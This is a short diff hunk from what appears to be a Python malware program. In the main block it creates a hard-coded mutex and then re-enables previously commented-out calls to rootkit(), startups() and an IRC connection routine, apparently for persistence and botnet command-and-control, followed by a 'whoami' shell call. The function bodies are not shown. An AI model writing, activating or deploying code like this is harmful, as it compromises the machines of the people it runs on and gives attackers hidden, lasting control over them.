@@ -2507,10 +2507,10 @@ if __name__ == '__main__':
     mutex_value = "0df98shuj87u8hu382jr892as543dfg"
     if create_mutex(mutex_value):
         print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Mutex created successfully.")
-        # rootkit()
-        # startups()
-        # asyncio.run(run_all_shit())
-        # connect_to_internet_relay_chat()
+        rootkit()
+        startups()
+        asyncio.run(run_all_shit())
+        connect_to_internet_relay_chat()
         print("checking")
         os.system("whoami")
     else:
